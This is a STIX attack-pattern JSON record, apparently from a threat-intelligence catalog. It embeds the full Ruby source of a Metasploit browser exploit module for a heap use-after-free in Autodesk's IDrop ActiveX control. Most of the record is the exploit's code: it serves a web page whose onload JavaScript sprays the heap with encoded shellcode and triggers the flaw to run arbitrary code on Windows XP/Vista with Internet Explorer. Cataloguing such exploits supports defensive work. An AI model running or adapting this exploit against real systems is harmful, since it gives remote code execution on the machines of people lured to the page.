{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3d128727-6008-4a6a-8762-ca387fc09d6b",
    "created": "2024-08-14T16:44:29.157413Z",
    "modified": "2024-08-14T16:44:29.157417Z",
    "name": "Autodesk IDrop ActiveX Control Heap Memory Corruption",
    "description": " This module exploits a heap-based memory corruption vulnerability in Autodesk IDrop ActiveX control (IDrop.ocx) version 17.1.51.160. An attacker can execute arbitrary code by triggering a heap use after free condition using the Src, Background, PackageXml properties.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/autodesk_idrop.rb",
            "external_id": "autodesk_idrop.rb"
        },
        {
            "source_name": "reference",
            "url": "http://marc.info/?l=full-disclosure&m=123870112214736"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Autodesk IDrop ActiveX Control Heap Memory Corruption',\n      'Description'    => %q{\n          This module exploits a heap-based memory corruption vulnerability in\n        Autodesk IDrop ActiveX control (IDrop.ocx) version 17.1.51.160.\n        An attacker can execute arbitrary code by triggering a heap use after\n        free condition using the Src, Background, PackageXml properties.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Elazar Broad <elazarb[at]earthlink.net>',   # Original exploit [see References]\n          'Trancer <mtrancer[at]gmail.com>'            # Metasploit implementation\n        ],\n      'References'     =>\n        [\n          [ 'OSVDB', '53265' ],\n          [ 'BID', '34352' ],\n          [ 'EDB', '8560' ],\n          [ 'URL', 'http://marc.info/?l=full-disclosure&m=123870112214736' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'         => 1024,\n          'BadChars'      => \"\\x00\\x09\\x0a\\x0d'\\\\\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP SP0-SP3 / Windows Vista SP0-SP1 / IE 6.0 SP0-2 & IE 7.0', { 'Offset' => 900, 'Ret' => 0x0C0C0C0C } ]\n        ],\n      'DisclosureDate' => '2009-04-02',\n      'DefaultTarget'  => 0))\n  end\n\n  def autofilter\n    false\n  end\n\n  def check_dependencies\n    use_zlib\n  end\n\n  def on_request_uri(cli, request)\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # Encode the shellcode\n    shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))\n\n    # Setup exploit buffers\n    nops \t  = Rex::Text.to_unescape([target.ret].pack('V'))\n    blocksize = 0x40000\n    fillto    = 550\n    offset \t  = target['Offset']\n\n    # Randomize the javascript variable names\n    idrop\t     = rand_text_alpha(rand(100) + 1)\n    j_function   = rand_text_alpha(rand(100) + 1)\n    j_shellcode  = rand_text_alpha(rand(100) + 1)\n    j_nops       = rand_text_alpha(rand(100) + 1)\n    j_headersize = rand_text_alpha(rand(100) + 1)\n    j_slackspace = rand_text_alpha(rand(100) + 1)\n    j_fillblock  = rand_text_alpha(rand(100) + 1)\n    j_block      = rand_text_alpha(rand(100) + 1)\n    j_memory     = rand_text_alpha(rand(100) + 1)\n    j_counter    = rand_text_alpha(rand(30) + 2)\n    j_ret        = rand_text_alpha(rand(100) + 1)\n    j_mem        = rand_text_alpha(rand(100) + 1)\n\n    # Build out the message\n    content = %Q|\n<html>\n<head>\n<script language='javascript' defer>\nfunction #{j_function}() {\n  #{j_shellcode}=unescape('#{shellcode}');\n  #{j_nops}=unescape('#{nops}');\n  #{j_headersize}=20;\n  #{j_slackspace}=#{j_headersize}+#{j_shellcode}.length;\n  while(#{j_nops}.length<#{j_slackspace})#{j_nops}+=#{j_nops};\n  #{j_fillblock}=#{j_nops}.substring(0,#{j_slackspace});\n  #{j_block}=#{j_nops}.substring(0,#{j_nops}.length-#{j_slackspace});\n  while(#{j_block}.length+#{j_slackspace}<#{blocksize})#{j_block}=#{j_block}+#{j_block}+#{j_fillblock};\n  #{j_memory}=new Array();\n  for(#{j_counter}=0;#{j_counter}<#{fillto};#{j_counter}++)#{j_memory}[#{j_counter}]=#{j_block}+#{j_shellcode};\n\n  var #{j_ret} = '';\n  for (#{j_counter}=0;#{j_counter}<=#{offset};#{j_counter}++) {\n    #{j_ret} += unescape('%u0a0a');\n  }\n  for(#{j_counter}=0;#{j_counter}<20;#{j_counter}++) {\n    try {\n      var #{j_mem} = #{idrop}.Src;\n      #{idrop}.Src = 'http://' + #{j_ret};\n      #{idrop}.Src = #{j_mem};\n      #{idrop}.Src = 'http://' + #{j_ret};\n    } catch(e){}\n\n  }\n}\n</script>\n</head>\n<body onload='return #{j_function}();'>\n<object classid='clsid:21E0CB95-1198-4945-A3D2-4BF804295F78' id='#{idrop}'></object>\n</body>\n</html>\n      |\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response_html(cli, content)\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-04-02",
    "x_mitre_platforms": [
        "win'"
    ]
}